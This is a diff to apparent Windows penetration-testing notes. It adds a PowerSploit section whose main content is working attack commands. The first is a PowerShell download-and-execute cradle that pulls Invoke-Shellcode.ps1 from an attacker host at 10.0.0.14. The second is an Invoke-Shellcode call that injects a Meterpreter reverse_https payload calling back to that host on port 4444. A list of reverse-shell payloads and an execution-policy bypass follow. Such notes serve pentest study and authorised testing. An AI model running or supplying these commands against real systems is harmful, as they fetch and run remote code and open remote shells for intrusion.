@@ -44,10 +44,27 @@ NetBIOS Name is a 16-byte name for a networking service or function on a machine
 
 * remote scan: `sudo nmap -sU --script nbstat.nse -p137 <host>`
 
-### Support tools
-Powerview is extremely useful to simplify your work with powershell:
-* get it: `wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1`
-* read the docs: https://powersploit.readthedocs.io/en/latest/Recon/
+### Support Tools
+
+* PowerSploit is extramely useful in general for all kind of windows pentesting
+* Each single Module can accessed as so after hosting the directory
+* for more info see: https://resources.infosecinstitute.com/topic/powershell-toolkit-powersploit/
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString(“http://10.0.0.14:8000/CodeExecution/Invoke-Shellcode.ps1”)
+
+Get-Help Invoke-Shellcode
+
+Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.14 -Lport 4444 -Force
+
+```
+
+Following metasploit payloads are supported
+
+```bash
+windows/meterpreter/reverse_http
+windows/meterpreter/reverse_https
+```
 
 ### Basic usage
 * start PS from cmd bypassing the execution policy: `powershell -ep bypass`
